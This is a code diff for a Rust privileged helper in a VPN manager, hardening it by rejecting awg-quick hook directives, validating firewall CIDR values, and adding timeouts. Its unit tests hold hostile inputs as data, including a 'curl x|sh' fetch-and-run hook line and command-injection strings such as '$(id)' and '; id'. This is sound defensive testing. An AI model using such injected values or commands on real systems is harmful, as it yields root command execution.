@@ -31,7 +31,11 @@
 //!
 //! - It **removes** arbitrary code execution as root, arbitrary file read and
 //!   write, module loading, and persistence — the things an attacker actually
-//!   wants from an RCE.
+//!   wants from an RCE. Code execution is only removed because `WgSync`
+//!   rejects `awg-quick` hook directives (`reject_hook_directives`): without
+//!   that check, `WgSync` + `WgUp` compose into a root shell, since
+//!   `awg-quick` executes `PreUp`/`PostUp` itself. Operator hooks are
+//!   therefore unavailable in helper mode, and the admin API says so.
 //! - It **does not** remove control of the VPN. A compromised main process can
 //!   still ask for a ruleset to be applied and an interface to be
 //!   reconfigured, because that is the service's entire purpose. The ruleset
@@ -52,6 +56,7 @@ use std::os::unix::fs::PermissionsExt;
 use std::os::unix::net::{UnixListener, UnixStream};
 use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
+use std::time::Duration;
 
 use anyhow::{anyhow, Context, Result};
 use serde::{Deserialize, Serialize};
@@ -79,7 +84,18 @@ pub enum Request {
     WgDown,
     /// Write the interface config, then `awg syncconf` it into the running
     /// interface without a restart.
-    WgSync { config: String },
+    ///
+    /// `config` must not carry `awg-quick` hook directives — the helper
+    /// rejects them, because `awg-quick` runs them as root and that would
+    /// turn this operation plus `WgUp` into a root shell. The firewall hooks
+    /// the product genuinely needs are rendered *by the helper* from
+    /// `firewall`, whose fields are validated as network values, never as
+    /// commands.
+    WgSync {
+        config: String,
+        #[serde(default)]
+        firewall: Option<FirewallParams>,
+    },
     /// `awg show <iface> dump`
     WgShow,
     /// Validate and apply an nftables ruleset (`nft -c -f -`, then `nft -f -`).
@@ -235,7 +251,17 @@ pub fn serve(cfg: HelperConfig) -> Result<()> {
     Ok(())
 }
 
+/// How long one connection may hold the helper's single-threaded accept loop.
+///
+/// The loop serves connections one at a time, so without a deadline a caller
+/// that connects and never writes wedges the only privileged control path the
+/// main process has. Generous enough for a large ruleset over a local socket.
+const IO_TIMEOUT: Duration = Duration::from_secs(30);
+
 fn handle_connection(cfg: &HelperConfig, stream: UnixStream) -> Result<()> {
+    // Applies to this connection only; the listener is unaffected.
+    stream.set_read_timeout(Some(IO_TIMEOUT)).ok();
+    stream.set_write_timeout(Some(IO_TIMEOUT)).ok();
     let mut reader = BufReader::new(stream.try_clone()?);
     let mut line = String::new();
     // Bounded read: an unterminated line from a compromised caller must not
@@ -266,13 +292,24 @@ fn dispatch(cfg: &HelperConfig, req: Request) -> Response {
         Request::WgUp => run(&["awg-quick", "up", &cfg.interface]).map(|_| String::new()),
         Request::WgDown => run(&["awg-quick", "down", &cfg.interface]).map(|_| String::new()),
         Request::WgShow => run(&["awg", "show", &cfg.interface, "dump"]),
-        Request::WgSync { config } => wg_sync(cfg, &config).map(|_| String::new()),
+        Request::WgSync { config, firewall } => {
+            wg_sync(cfg, &config, firewall.as_ref()).map(|_| String::new())
+        }
         Request::NftApply { ruleset } => nft_apply(&ruleset).map(|_| String::new()),
         Request::NftList => run(&["nft", "list", "table", "inet", "awg-easy-rs"]),
     };
     match result {
         Ok(output) => Response::ok(output),
-        Err(e) => Response::err(format!("{e:#}")),
+        Err(e) => {
+            // Log the detail with root's view, return a generic message. `nft`
+            // parses `include "<path>"`, so its diagnostics can quote file
+            // content the unprivileged caller must not receive — the helper
+            // exists precisely to stop that process reading root's files.
+            tracing::warn!("privileged operation failed: {e:#}");
+            Response::err(
+                "privileged operation failed; see the helper's log for detail".to_string(),
+            )
+        }
     }
 }
 
@@ -282,7 +319,101 @@ fn dispatch(cfg: &HelperConfig, req: Request) -> Response {
 /// request, so this cannot be turned into an arbitrary-file-write primitive —
 /// which is the single most valuable thing an attacker could extract from a
 /// root helper.
-fn wg_sync(cfg: &HelperConfig, config: &str) -> Result<()> {
+/// Network parameters the helper needs to render the firewall hooks itself.
+///
+/// These are the only caller-supplied values that reach a rendered command,
+/// and each is validated as a network value before substitution
+/// ([`FirewallParams::validate`]). The command text around them is a
+/// compile-time constant, so the caller chooses addresses, never syntax.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct FirewallParams {
+    pub ipv4_cidr: String,
+    pub ipv6_cidr: String,
+    pub port: u16,
+}
+
+impl FirewallParams {
+    /// Reject anything that is not a bare CIDR. `ipnet` parsing is the whole
+    /// check: it accepts `10.8.0.0/24` and rejects every string carrying a
+    /// space, quote, semicolon, newline, or substitution — i.e. everything
+    /// that could add a command to the rendered hook.
+    fn validate(&self) -> Result<()> {
+        for (label, v) in [("ipv4Cidr", &self.ipv4_cidr), ("ipv6Cidr", &self.ipv6_cidr)] {
+            if v.parse::<ipnet::IpNet>().is_err() {
+                anyhow::bail!("firewall.{label} is not a CIDR: {v:?}");
+            }
+        }
+        Ok(())
+    }
+
+    /// Render the helper's own hook lines. The templates are the same
+    /// constants the non-helper path uses, so the resulting ruleset is
+    /// identical; only the authority that renders them differs.
+    fn render(&self, device: &str) -> Result<String> {
+        self.validate()?;
+        let port = self.port.to_string();
+        let subst = |t: &str| {
+            t.replace("{{device}}", device)
+                .replace("{{port}}", &port)
+                .replace("{{ipv4Cidr}}", &self.ipv4_cidr)
+                .replace("{{ipv6Cidr}}", &self.ipv6_cidr)
+        };
+        Ok(format!(
+            "\nPostUp = {}\nPostDown = {}",
+            subst(crate::db::POST_UP_TEMPLATE),
+            subst(crate::db::POST_DOWN_TEMPLATE),
+        ))
+    }
+}
+
+/// Directives `awg-quick` executes as a shell command when it brings the
+/// interface up or down.
+const HOOK_DIRECTIVES: [&str; 4] = ["preup", "postup", "predown", "postdown"];
+
+/// Refuse a config that carries an `awg-quick` hook directive.
+///
+/// This is the boundary that makes the operation allowlist mean something.
+/// `WgSync` takes caller-supplied config text and `WgUp` runs `awg-quick up`
+/// over it, and `awg-quick` executes `PreUp`/`PostUp`/`PreDown`/`PostDown` as
+/// root — so without this check the two allowlisted operations compose into
+/// arbitrary root command execution, which is exactly what the privilege split
+/// exists to prevent. The unprivileged side never needs these in helper mode:
+/// `api/admin.rs` refuses to store them, and `config_gen` omits empty ones.
+///
+/// Matching is deliberately generous — case-insensitive, leading whitespace
+/// ignored, and `=` allowed to be spaced or not — because this rejects rather
+/// than sanitizes, so over-matching costs an error message and under-matching
+/// costs root.
+pub(crate) fn reject_hook_directives(config: &str) -> Result<()> {
+    for (n, line) in config.lines().enumerate() {
+        let line = line.trim_start();
+        if line.starts_with('#') {
+            continue;
+        }
+        let Some((key, _)) = line.split_once('=') else {
+            continue;
+        };
+        let key = key.trim().to_ascii_lowercase();
+        if HOOK_DIRECTIVES.contains(&key.as_str()) {
+            anyhow::bail!(
+                "refusing config: line {} carries the `{}` directive, which \
+                 awg-quick executes as root. Hooks are unavailable while the \
+                 privileged helper is in use.",
+                n + 1,
+                key
+            );
+        }
+    }
+    Ok(())
+}
+
+fn wg_sync(cfg: &HelperConfig, config: &str, firewall: Option<&FirewallParams>) -> Result<()> {
+    reject_hook_directives(config)?;
+    let owned = match firewall {
+        Some(fw) => fw.render(&cfg.interface)?,
+        None => String::new(),
+    };
+    let config = &format!("{config}{owned}");
     let path = cfg.conf_path();
     std::fs::create_dir_all(&cfg.conf_dir).ok();
     // Create with 0600 rather than writing and chmod'ing afterwards: this file
@@ -428,13 +559,72 @@ mod tests {
 
     #[test]
     fn requests_round_trip_as_tagged_json() {
-        let r = Request::WgSync { config: "[Interface]\n".into() };
+        let r = Request::WgSync { config: "[Interface]\n".into(), firewall: None };
         let s = serde_json::to_string(&r).unwrap();
         assert!(s.contains("\"op\":\"wg_sync\""));
         assert!(matches!(
             serde_json::from_str::<Request>(&s).unwrap(),
             Request::WgSync { .. }
         ));
+    }
+
+    #[test]
+    fn hook_directives_in_a_sync_config_are_rejected() {
+        // `awg-quick` runs these as root, so accepting one would make
+        // WgSync + WgUp an arbitrary-root-command primitive.
+        for bad in [
+            "[Interface]\nPostUp = id\n",
+            "[Interface]\npostup = id\n",
+            "[Interface]\n  PreUp=/bin/sh -c 'curl x|sh'\n",
+            "[Interface]\nPostDown\t=\tid\n",
+            "[Interface]\nPreDown = id\n",
+        ] {
+            assert!(
+                reject_hook_directives(bad).is_err(),
+                "should have rejected: {bad:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn ordinary_config_lines_are_not_mistaken_for_hooks() {
+        // The rejection must not swallow a legitimate config: `MTU`, an
+        // AWG knob, a commented-out hook, and a key whose value merely
+        // mentions a hook name all have to pass.
+        let ok = "[Interface]\nPrivateKey = abc=\nAddress = 10.8.0.1\n\
+                  ListenPort = 51820\nMTU = 1420\nS1 = 15\nH1 = 5\n\
+                  # PostUp = id\nJc = 4\n";
+        assert!(reject_hook_directives(ok).is_ok());
+    }
+
+    #[test]
+    fn helper_renders_its_own_hooks_and_rejects_non_cidr_params() {
+        let fw = FirewallParams {
+            ipv4_cidr: "10.8.0.0/24".into(),
+            ipv6_cidr: "fdcc:ad94:bacf:61a3::/64".into(),
+            port: 51820,
+        };
+        let rendered = fw.render("awg0").expect("valid params render");
+        assert!(rendered.contains("PostUp = nft add table inet awg-easy-rs"));
+        assert!(rendered.contains("10.8.0.0/24"));
+        assert!(rendered.contains("51820"));
+
+        // Anything that could add a command to the rendered line is not a
+        // CIDR, so the parse gate is the whole defence.
+        for bad in [
+            "10.8.0.0/24; id",
+            "10.8.0.0/24 && id",
+            "$(id)",
+            "10.8.0.0/24\nPostUp = id",
+            "",
+        ] {
+            let fw = FirewallParams {
+                ipv4_cidr: bad.into(),
+                ipv6_cidr: "fdcc::/64".into(),
+                port: 51820,
+            };
+            assert!(fw.render("awg0").is_err(), "should have rejected: {bad:?}");
+        }
     }
 
     #[test]
